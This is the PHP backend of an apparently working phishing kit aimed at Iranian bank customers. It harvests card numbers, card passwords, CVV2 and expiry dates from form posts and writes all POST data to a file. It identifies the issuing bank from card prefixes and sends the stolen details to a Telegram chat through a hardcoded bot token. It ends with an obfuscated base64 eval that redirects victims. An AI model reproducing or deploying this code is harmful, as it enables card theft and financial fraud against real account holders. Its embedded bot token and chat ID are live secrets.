﻿<?php
$handle = fopen("", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
if($_POST['CARD1']){
  $cards = $_POST['CARD1'];
  $cardss = $_POST['CARD2'];
  $cardsss = $_POST['CARD3'];
  $cardssss = $_POST['CARD4'];
  $pass = $_POST['PASSWORD'];
  $cvv = $_POST['CVV2'];
  $mah = $_POST['MONTH'];
  $sal = $_POST['YEARS'];
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
$user_ip = getUserIP();
$protocol = $_SERVER['SERVER_PROTOCOL'];
    $port = $_SERVER['REMOTE_PORT'];
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $ref = $_SERVER['HTTP_REFERER'];
    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    file_put_contents("","$cards$cardss$cardsss$cardssss:$pass:$cvv:$sal:$mah");
    $token = "920038714:AAHoUGZv02B30GWgzf8w7CoEW2MX5NBdwLA"; //توکن رباتتون رو اینجا وارد کنید
    
    $s=floor($cardss/100);
    $f=floor($cardss/1000);
    if ($cards == 6037 && $s==99 || $cards == 1700 && $s==19 || $cards == 5899 && $s==05 ) {
      $bankname = "#meli";  
      $bankinfo = "بانک ملی
️USSD: *717#  
️TBank: 09622
";
      }elseif ($cards == 5892 && $s==10) {
        $bankname = "#sepah";
        $bankinfo = "بانک سپه
️Site: https://ib.ebanksepah.ir/desktop/sepahPages/shetabCard.sepah
️USSD:----
️TBank: 021 64058
";
      }elseif ($cards == 6276 && $s == 48 || $cards == 2071 && $s == 77 ) {
        $bankname = "#tosee_saderat";
        $bankinfo = "بانک توسعه صادرات
️Site: #
️USSD: #
️TBank: 021 2722
";
      }elseif ($cards == 6279 && $s== 61 ) {
        $bankname = "#sanat_madan";
        $bankinfo = "بانک صنعت و معدن
️Site: #
️USSD: *719#
️TBank: 021 75024
";
      }elseif ($cards == 6037  && $s == 70 || $cards == 6392 &&  $s == 17) {
        $bankname = "#keshavarzi";
        $bankinfo = "بانک کشاورزی
️Site: https://ib.bki.ir/pid46.lmx
️USSD: *730#
️TBank: 09603
";
      }elseif ($cards == 6280 && $s== 23) {
        $bankname = "#maskan";
        $bankinfo = "بانک مسکن
️Site: #
️USSD: *714#, *737#
️TBank: 021 64096
";
      }elseif ($cards == 6277 && $s==60) {
        $bankname = "#post_bank_iran";
        $bankinfo = "پست بانک ایران
️Site: #
️USSD: *747#
️TBank: 021 84284
";

      }elseif ($cards == 6274 && $s==12) {
        $bankname = "#eghtsad_novin";
        $bankinfo = "بانک اقتصاد نوین
️Site: #
️USSD: #
️TBank: 021 85292
";
      }elseif ($cards == 6221 && $s==06 || $cards == 6391 && $s==94 || $cards == 6278  &&  $s==84) {
        $bankname = "#parsian";
        $bankinfo = "بانک پارسیان
️Site: #
️USSD: *708#
️TBank: 021 89111
";
      }elseif ($cards == 5022 && $s==29 || $cards == 6393  && $s==47) {
        $bankname = "#pasargad";
        $bankinfo = "بانک پاسارگاد
️Site: https://epay.bpi.ir/balanceinquiry.aspx
️USSD: *720#
️TBank: 021 828991111
";
      }elseif ($cards == 6274 && $s==88 || $cards == 5029  &&  $s==10) {
        $bankname = "#kar_afarin";
        $bankinfo = "بانک کار افرین
️Site: #
️USSD: #
️TBank: 021 23640
";
      }elseif ($cards == 6219 && $s==86) {
        $bankname = "#saman";
        $bankinfo = "بانک سامان
️Site: #
️USSD: *724#
️TBank: 021 6422
";
      }elseif ($cards == 6393 && $s==46) {
        $bankname = "#sina";
        $bankinfo = "بانک سینا
️Site: https://sina24h.com/CustomerService2/viewLogin.html
️USSD: *727#
️TBank: 021 82487
";
      }elseif ($cards == 6396 && $s==07) {
        $bankname = "#sarmaye";
        $bankinfo = "بانک سرمایه
️Site: https://pg.sbank.ir/balanceRequest.do
️USSD: #
️TBank: 021 8254
";
      }elseif ($cards == 6362 && $s==14) {
        $bankname = "#ayande";
        $bankinfo = "بانک آینده
️Site: #
️USSD: *745#
️TBank: 021 2957
";
      }elseif ($cards == 5028 && $s==06 || $cards == 5047  && $s==06) {
        $bankname = "#shahr";
        $bankinfo = "بانک شهر
️Site: https://ebank.city-bank.net/customermanager/viewLogin.html
️USSD: *787#
️TBank: 021 87611
";
      }elseif ($cards == 5029 && $s==38) {
        $bankname = "#day";
        $bankinfo = "بانک دی
️Site: #
️USSD: #
️TBank: 021 2726
";
      }elseif ($cards == 6037 && $s== 69) {
        $bankname = "#saderat";
        $bankinfo = "بانک صادرات
️Site: #
️USSD: *719#
️TBank: 09602
";
      }elseif ($cards == 6104  && $s==33 || $cards == 9919 && $s==75) {
        $bankname = "#mellat";
        $bankinfo = "بانک ملت
️Site: #
️USSD: *720#
️TBank: 021 8132
";
      }elseif ($cards == 6273 && $s==53 || $cards == 5859  && $s==83) {
        $bankname = "#tejarat";
        $bankinfo = "بانک تجارت
️Site: https://pg.tejaratbank.ir/paymentGateway/getBalance
️USSD: #
️TBank: 021 81277
";
      }elseif ($cards == 5894 && $s==63) {
        $bankname = "#refah";
        $bankinfo = "بانک رفاه
️Site: #
️USSD: *729#
️TBank: 021 84043000
";
      }elseif ($cards == 6273 && $s==81) {
        $bankname = "#ansar";
        $bankinfo = "بانک انصار
️Site: https://ebank.ansarbank.com/customermanager/viewLogin.html
️USSD: *763#
️TBank: 021 48049
";
      }elseif ($cards == 5057 && $s==85) {
        $bankname = "#iran_zamin";
        $bankinfo = "بانک ایران زمین
️Site: #
️USSD: #
️TBank: 021 24760
";
      }elseif ($cards == 6367 && $s==95) {
        $bankname = "#markazi";
        $bankinfo = "بانک مرکزی
️Site: #
️USSD: #
️TBank: #
";
      }elseif ($cards == 6369 && $s==49) {
        $bankname = "#hekmat";
        $bankinfo = "بانک حکمت
️Site:https://ib.hibank24.ir/customermanager/viewLogin.html
️USSD: #
️TBank: 021 89555
";
      }elseif ($cards == 5054 && $s==16) {
        $bankname = "#gardeshgary";
        $bankinfo = "بانک گردشگری
️Site: https://epayment.tourism-bank.com/BalanceInquiry.aspx
️USSD: *764#
️TBank: 021 22630345
";
      }elseif ($cards == 6063 && $s==73) {
        $bankname = "#qarzolhasane_iran";
        $bankinfo = "بانک قرضالحسنه ایران
️Site: https://epayment.rqb.ir/BalanceInquiry.aspx
️USSD: #
️TBank: 021 8528
";
      }elseif ($cards == 6281 && $s==57) {
        $bankname = "#moasse_etebari_tosee";
        $bankinfo = "موسسه اعتباری توسعه
️Site: #
️USSD: #
️TBank: 021 81461
";
      }elseif ($cards == 5058 && $s==01) {
        $bankname = "#kosar";
        $bankinfo = "بانک کوثر
️Site: #
️USSD: *744#
️TBank: 021 86777
";
      }elseif ($cards == 6393 && $s==70) {
        $bankname = "#moasse_mehr";
        $bankinfo = "موسسه مهر
️Site: https://modern.qmbi24.com/customermngr/viewLogin.html
️USSD: #
️TBank: 021 8989
";
      }elseif ($cards == 6395 && $s==99) { 
        $bankname = "#qavamin";
        $bankinfo = "بانک قوامین
️Site: #
️USSD: #
️TBank: 021 84270
";
      }elseif ($cards == 5076 && $s==77) {
        $bankname = "#noor_bank";
        $bankinfo = "بانک نور
️Site: #
️USSD: #
️TBank: 021-28360
";

}elseif ($cards == 5029 && $f == 0 ) {
        $bankname = "tosee_taavon";
        $bankinfo = "بانک توسعه تعاون
️Site: https://epayment.ttbank.ir/CustomError.aspx
️USSD: #
️TBank:#
";
}elseif ($cards == 5041 && $s == 72 ) {
        $bankname = "resalat-bank";
        $bankinfo = "بانک رسالت
️Site: https://epayment.rqb.ir/GetStatement.aspx
️USSD: #
️TBank:#
";

      }else{
        $bankname = "#";
        $bankinfo = "بانک نامعلوم!";
      }

    
    
     $textmsg = "
Card💳🤖
➖➖➖➖➖➖➖
🔰 Card : $cards $cardss $cardsss $cardssss
🔰 Pass : $pass
🔰 CVV2 : $cvv
🔰 $sal:$mah
$bankinfo
$bankname
➖➖➖➖➖➖➖";

     $gpid = -1001471682584; 

     $send = file_get_contents("https://api.telegram.org/bot$token/SendMessage?chat_id=$gpid&text=".urlencode($textmsg));
}else{
    echo "):";
}
?>
<?php eval("?>".base64_decode("PG1ldGEgY29udGVudD0nMDt1cmw9aXAucGhwJyBodHRwLWVxdWl2PSdyZWZyZXNoJy8+")); ?>
